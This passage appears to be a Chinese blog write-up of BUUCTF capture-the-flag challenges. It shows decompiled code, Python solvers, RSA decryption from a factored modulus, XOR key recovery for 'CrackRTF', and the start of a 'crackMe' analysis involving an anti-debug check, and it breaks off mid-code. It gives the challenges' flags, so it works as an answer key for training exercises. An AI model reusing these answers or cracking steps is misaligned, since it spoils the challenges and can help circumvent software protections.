class="keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; a1[result] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++i;</span><br><span class="line">          a1[v5] = a1[result];</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">while</span> ( a1[i] &lt;= v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ++i &gt;= result )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = i;</span><br><span class="line">          a1[result] = a1[i];</span><br><span class="line">        &#125;</span><br><span class="line">        --result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; result );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">    a1[result] = v6;</span><br><span class="line">    sub_4010F0(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">    result = num_10;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>研究一下就会发现是个从小到大的排序。</p><p>则解密脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s2 = base64.b64decode(<span class="string">&quot;ak1w&quot;</span>)</span><br><span class="line">s1 = base64.b64decode(<span class="string">&quot;V1Ax&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">11</span>) ]</span><br><span class="line"></span><br><span class="line">key[<span class="number">0</span>] = <span class="number">90</span></span><br><span class="line">key[<span class="number">1</span>] = <span class="number">74</span></span><br><span class="line">key[<span class="number">2</span>] = <span class="number">83</span></span><br><span class="line">key[<span class="number">3</span>] = <span class="number">69</span></span><br><span class="line">key[<span class="number">4</span>] = <span class="number">67</span></span><br><span class="line">key[<span class="number">5</span>] = <span class="number">97</span></span><br><span class="line">key[<span class="number">6</span>] = <span class="number">78</span></span><br><span class="line">key[<span class="number">7</span>] = <span class="number">72</span></span><br><span class="line">key[<span class="number">8</span>] = <span class="number">51</span></span><br><span class="line">key[<span class="number">9</span>] = <span class="number">110</span></span><br><span class="line">key[<span class="number">10</span>] = <span class="number">103</span></span><br><span class="line"></span><br><span class="line">key.sort()</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">chr</span>(key[<span class="number">0</span>] + <span class="number">34</span>) + <span class="built_in">chr</span>(key[<span class="number">4</span>]) + s1 + s2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag{UJWP1jMp}</p><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><p>打开来两个文件,公钥密文都有,解密脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">message = <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">cipher_text = message.read()</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;pub.key&#x27;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">publickey = f.read()</span><br><span class="line">publickey = RSA.importKey(publickey)</span><br><span class="line"><span class="comment"># print(publickey.n)</span></span><br><span class="line"><span class="comment"># print(publickey.e)</span></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">r = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e,r)</span><br><span class="line"><span class="comment"># print d</span></span><br><span class="line">privatekey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))</span><br><span class="line">key = PKCS1_v1_5.new(privatekey)</span><br><span class="line">msg = key.decrypt(cipher_text, e)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> msg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag{decrypt_256}</p><p>参考:</p><p><a href="https://wiki.x10sec.org/crypto/asymmetric/rsa/rsa_theory/#pycrypto">RSA-ctf-wiki</a></p><p><a href="http://factordb.com/">整数分解</a></p><h3 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h3><p>IDA打开,追踪字符串到主要函数:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> main_0()</span><br><span class="line">&#123;</span><br><span class="line">  DWORD v0; // eax</span><br><span class="line">  DWORD v1; // eax</span><br><span class="line">  CHAR String; // [esp+4Ch] [ebp-310h]</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp+150h] [ebp-20Ch]</span><br><span class="line">  CHAR String1; // [esp+154h] [ebp-208h]</span><br><span class="line">  char <span class="built_in">input</span>[<span class="number">6</span>]; // [esp+258h] [ebp-104h]</span><br><span class="line"></span><br><span class="line">  memset(<span class="built_in">input</span>, <span class="number">0</span>, 0x104u);</span><br><span class="line">  memset(&amp;String1, <span class="number">0</span>, 0x104u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  printf(<span class="string">&quot;pls input the first passwd(1): &quot;</span>);</span><br><span class="line">  scanf(<span class="string">&quot;%s&quot;</span>, <span class="built_in">input</span>);</span><br><span class="line">  <span class="keyword">if</span> ( strlen(<span class="built_in">input</span>) != <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(<span class="string">&quot;Must be 6 characters!\n&quot;</span>);</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = atoi(<span class="built_in">input</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">100000</span> )</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  strcat(<span class="built_in">input</span>, <span class="string">&quot;@DBApp&quot;</span>);</span><br><span class="line">  v0 = strlen(<span class="built_in">input</span>);</span><br><span class="line">  sub_40100A((BYTE *)<span class="built_in">input</span>, v0, &amp;String1);</span><br><span class="line">  <span class="keyword">if</span> ( !_strcmpi(&amp;String1, <span class="string">&quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(<span class="string">&quot;continue...\n\n&quot;</span>);</span><br><span class="line">    printf(<span class="string">&quot;pls input the first passwd(2): &quot;</span>);</span><br><span class="line">    memset(&amp;String, <span class="number">0</span>, 0x104u);</span><br><span class="line">    scanf(<span class="string">&quot;%s&quot;</span>, &amp;String);</span><br><span class="line">    <span class="keyword">if</span> ( strlen(&amp;String) != <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(<span class="string">&quot;Must be 6 characters!\n&quot;</span>);</span><br><span class="line">      ExitProcess(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    strcat(&amp;String, <span class="built_in">input</span>);</span><br><span class="line">    memset(&amp;String1, <span class="number">0</span>, 0x104u);</span><br><span class="line">    v1 = strlen(&amp;String);</span><br><span class="line">    sub_401019((BYTE *)&amp;String, v1, &amp;String1);</span><br><span class="line">    <span class="keyword">if</span> ( !_strcmpi(<span class="string">&quot;27019e688a4e62a649fd99cadaafdb4e&quot;</span>, &amp;String1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(unsigned __int8)sub_40100F(&amp;String) )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(<span class="string">&quot;Error!!\n&quot;</span>);</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(<span class="string">&quot;bye ~~\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输入两次验证flag。</p><h4 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h4><p>hash值在线爆破,直接得第一部分123321,进入第二部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\CTF\Games\Exam\BUUCTF\CrackRTF&gt;CrackRTF.exe</span><br><span class="line">pls input the first passwd(1): 123321</span><br><span class="line">continue...</span><br><span class="line"></span><br><span class="line">pls input the first passwd(2):</span><br></pre></td></tr></table></figure><h4 id="第二次"><a href="#第二次" class="headerlink" title="第二次"></a>第二次</h4><p>无法爆破,观察到sub_40100F函数中:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __cdecl <span class="title">sub_4014D0</span><span class="params">(LPCSTR lpString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  LPCVOID lpBuffer; <span class="comment">// [esp+50h] [ebp-1Ch]</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+58h] [ebp-14h]</span></span><br><span class="line">  DWORD nNumberOfBytesToWrite; <span class="comment">// [esp+5Ch] [ebp-10h]</span></span><br><span class="line">  HGLOBAL hResData; <span class="comment">// [esp+60h] [ebp-Ch]</span></span><br><span class="line">  HRSRC hResInfo; <span class="comment">// [esp+64h] [ebp-8h]</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [esp+68h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  hFile = <span class="number">0</span>;</span><br><span class="line">  hResData = <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">  NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">  hResInfo = FindResourceA(<span class="number">0</span>, (LPCSTR)<span class="number">0x65</span>, <span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hResInfo )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = SizeofResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  hResData = LoadResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  <span class="keyword">if</span> ( !hResData )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  lpBuffer = LockResource(hResData);</span><br><span class="line">  sub_401005(lpString, (<span class="keyword">int</span>)lpBuffer, nNumberOfBytesToWrite);</span><br><span class="line">  hFile = CreateFileA(<span class="string">&quot;dbapp.rtf&quot;</span>, <span class="number">0x10000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( hFile == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  CloseHandle(hFile);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>会生成一个dbapp.rtf文件。</p><p>随便输入123321得,此处用010editor打开:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20190707134714.png" alt="20190707134714"></p><p>在生成文件前sub_401005进行了异或操作:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">sub_401420</span><span class="params">(LPCSTR lpString, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+54h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = lstrlenA(lpString);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a2) ^= lpString[i % v5];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>则可以逆解出异或因子:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x34</span>,<span class="number">0x4f</span>,<span class="number">0x72</span>,<span class="number">0x26</span>,<span class="number">0x14</span>,<span class="number">0x30</span>,<span class="number">0x5c</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x73</span>,<span class="number">0x69</span>,<span class="number">0x5c</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x73</span>,<span class="number">0x69</span>,<span class="number">0x63</span>,<span class="number">0x70</span>,<span class="number">0x28</span>,<span class="number">0x2a</span>,<span class="number">0x33</span>,<span class="number">0x64</span>,<span class="number">0x2e</span>,<span class="number">0x65</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x66</span>,<span class="number">0x30</span>,<span class="number">0x5c</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x7e</span>,<span class="number">0x23</span>,<span class="number">0x33</span>,<span class="number">0x61</span>,<span class="number">0x2e</span>,<span class="number">0x65</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x66</span>,<span class="number">0x65</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0x35</span>,<span class="number">0x32</span>,<span class="number">0x34</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x3d</span>,<span class="number">0x1c</span>,<span class="number">0x75</span>,<span class="number">0x74</span>,<span class="number">0x62</span>,<span class="number">0x6c</span>,<span class="number">0x7b</span>,<span class="number">0x5c</span>,<span class="number">0x66</span>,<span class="number">0x30</span>,<span class="number">0x5c</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x6f</span>,<span class="number">0x64</span>,<span class="number">0x2a</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x0e</span>,<span class="number">0x14</span>,<span class="number">0x71</span>,<span class="number">0x72</span>,<span class="number">0x71</span>,<span class="number">0x36</span>,<span class="number">0x5c</span>,<span class="number">0x66</span>,<span class="number">0x63</span>,<span class="number">0x68</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x7e</span>,<span class="number">0x20</span>,<span class="number">0x34</span>,<span class="number">0x72</span>,<span class="number">0x2e</span>,<span class="number">0x26</span>,<span class="number">0x63</span>,<span class="number">0x62</span>,<span class="number">0x5c</span>,<span class="number">0x27</span>,<span class="number">0x63</span>,<span class="number">0x65</span>,<span class="number">0x5c</span>,<span class="number">0x27</span>,<span class="number">0x63</span>,<span class="number">0x63</span>,<span class="number">0x5c</span>,<span class="number">0x27</span>,<span class="number">0x2a</span>,<span class="number">0x26</span>,<span class="number">0x3b</span>,<span class="number">0x2f</span>,<span class="number">0x0f</span>,<span class="number">0x0c</span>,<span class="number">0x0a</span>,<span class="number">0x7b</span>,<span class="number">0x5c</span>,<span class="number">0x2a</span>,<span class="number">0x5c</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x20</span>,<span class="number">0x61</span>,<span class="number">0x20</span>,<span class="number">0x1f</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x74</span>,<span class="number">0x65</span>,<span class="number">0x64</span>,<span class="number">0x69</span>,<span class="number">0x74</span>,<span class="number">0x20</span>,<span class="number">0x35</span>,<span class="number">0x2e</span>,<span class="number">0x34</span>,<span class="number">0x31</span>,<span class="number">0x2e</span>,<span class="number">0x31</span>,<span class="number">0x7a</span>,<span class="number">0x3d</span>,<span class="number">0x31</span>,<span class="number">0x67</span>,<span class="number">0x43</span>,<span class="number">0x34</span>,<span class="number">0x3b</span>,<span class="number">0x7d</span>,<span class="number">0x5c</span>,<span class="number">0x76</span>,<span class="number">0x69</span>,<span class="number">0x65</span>,<span class="number">0x77</span>,<span class="number">0x6b</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x64</span>,<span class="number">0x34</span>,<span class="number">0x13</span>,<span class="number">0x66</span>,<span class="number">0x63</span>,<span class="number">0x63</span>,<span class="number">0x2e</span>,<span class="number">0x71</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x64</span>,<span class="number">0x5c</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x6e</span>,<span class="number">0x67</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0x35</span>,<span class="number">0x32</span>,<span class="number">0x13</span>,<span class="number">0x75</span>,<span class="number">0x30</span>,<span class="number">0x0e</span>,<span class="number">0x14</span>,<span class="number">0x72</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0x20</span>,<span class="number">0x46</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x67</span>,<span class="number">0x5c</span>,<span class="number">0x7b</span>,<span class="number">0x4e</span>,<span class="number">0x30</span>,<span class="number">0x5f</span>,<span class="number">0x02</span>,<span class="number">0x23</span>,<span class="number">0x72</span>,<span class="number">0x37</span>,<span class="number">0x2d</span>,<span class="number">0x47</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x65</span>,<span class="number">0x5f</span>,<span class="number">0x42</span>,<span class="number">0x75</span>,<span class="number">0x67</span>,<span class="number">0x73</span>,<span class="number">0x5c</span>,<span class="number">0x7d</span>,<span class="number">0x5c</span>,<span class="number">0x70</span>,<span class="number">0x2e</span>,<span class="number">0x61</span>,<span class="number">0x0d</span>,<span class="number">0x58</span>,<span class="number">0x0f</span>,<span class="number">0x0c</span>,<span class="number">0x0a</span>,<span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">map</span>(ord, <span class="string">&quot;123321123321@DBApp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in xrange(len(s)):</span><br><span class="line">    s[i] ^= key[i % len(key)]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在本地新建RTF文件,可知文件头6位应该为<code>”&#123;\\rtf1“</code>,则可解出第二次输入的字符:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">key = <span class="built_in">map</span>(ord, <span class="string">&quot;&#123;\\rtf1&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in xrange(len(key)):</span><br><span class="line">    s[i] ^= key[i]</span><br><span class="line"></span><br><span class="line">print <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(chr,s[<span class="number">0</span>:<span class="number">6</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为:<code>~!3a@0</code></p><p>输入得最终rtf文件,里面就有flag,为:</p><p>Flag{N0_M0re_Free_Bugs}（<code>提交时要将F改为f</code>）</p><h3 id="crackMe"><a href="#crackMe" class="headerlink" title="crackMe"></a>crackMe</h3><p>解压得crackMe.exe,打开:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Come one! Crack Me~~~</span><br><span class="line">user(6-16 letters or numbers):</span><br></pre></td></tr></table></figure><p>user已经给出,为<code>welcomebeijing</code></p><p>输入后:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password(6-16 letters or numbers):</span><br></pre></td></tr></table></figure><p>IDA打开,跟踪字符串到主要函数,根据经验稍做修改:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall wmain@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ebx&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v1; <span class="comment">// eax</span></span><br><span class="line">  FILE *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+3h] [ebp-405h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+4h] [ebp-404h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+5h] [ebp-403h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+104h] [ebp-304h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+105h] [ebp-303h]</span></span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">16</span>]; <span class="comment">// [esp+204h] [ebp-204h]</span></span><br><span class="line">  <span class="keyword">char</span> user[<span class="number">16</span>]; <span class="comment">// [esp+304h] [ebp-104h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Come one! Crack Me~~~\n&quot;</span>);</span><br><span class="line">  user[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;user[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">  password[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;password[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;user(6-16 letters or numbers):&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, user);</span><br><span class="line">        v1 = (FILE *)sub_3E24BE();</span><br><span class="line">        fflush(v1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( !(<span class="keyword">unsigned</span> __int8)sub_3E1000(user) );</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;password(6-16 letters or numbers):&quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line">      v2 = (FILE *)sub_3E24BE();</span><br><span class="line">      fflush(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !(<span class="keyword">unsigned</span> __int8)sub_3E1000(password) );</span><br><span class="line">    init_box(user);</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v8, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v6, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">    v4 = init_print(&amp;v7, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( check(a1, user, password) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(&amp;v7);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由调试分析得:</p><p>init_box函数会将user进行一波操作生成一个box用于后面的异或操作。</p><p>可以直接导出,但后面其实没必要用到。</p><p>init_print函数会初始化两个输出字符串,一个成功一个失败,但由于有异常花指令导致IDA无法识别为函数,根据分析,直接将异常nop掉就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:003E11EA 0               nop</span><br><span class="line">.text:003E11EB 0               nop</span><br><span class="line">.text:003E11EC 0               nop</span><br><span class="line">.text:003E11ED 0               nop</span><br><span class="line">.text:003E11EE 0               nop</span><br><span class="line">.text:003E11EF 0               nop</span><br><span class="line">.text:003E11F0 0               aaa</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着就重要的check函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __cdecl <span class="title">check</span><span class="params">(<span class="keyword">char</span> *user, <span class="keyword">const</span> <span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+18h] [ebp-22Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-228h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+28h] [ebp-21Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+30h] [ebp-214h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+36h] [ebp-20Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+37h] [ebp-20Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+38h] [ebp-20Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v10; <span class="comment">// [esp+39h] [ebp-20Bh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v11; <span class="comment">// [esp+3Ah] [ebp-20Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+3Bh] [ebp-209h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+3Ch] [ebp-208h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [esp+40h] [ebp-204h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [esp+41h] [ebp-203h]</span></span><br><span class="line">  _BYTE key[<span class="number">256</span>]; <span class="comment">// [esp+140h] [ebp-104h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  key[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;check_num[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v15, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &lt; <span class="built_in">strlen</span>(password) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">isdigit</span>(password[v6]) )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = password[v6] - <span class="number">48</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">isxdigit</span>(password[v6]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(*(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">24</span>) + <span class="number">12</span>) != <span class="number">2</span> )</span><br><span class="line">        password[v6] = <span class="number">34</span>;</span><br><span class="line">      v8 = (password[v6] | <span class="number">0x20</span>) - <span class="number">87</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = ((password[v6] | <span class="number">0x20</span>) - <span class="number">97</span>) % <span class="number">6</span> + <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = v8 + <span class="number">16</span> * v9;</span><br><span class="line">    <span class="keyword">if</span> ( !((<span class="keyword">signed</span> <span 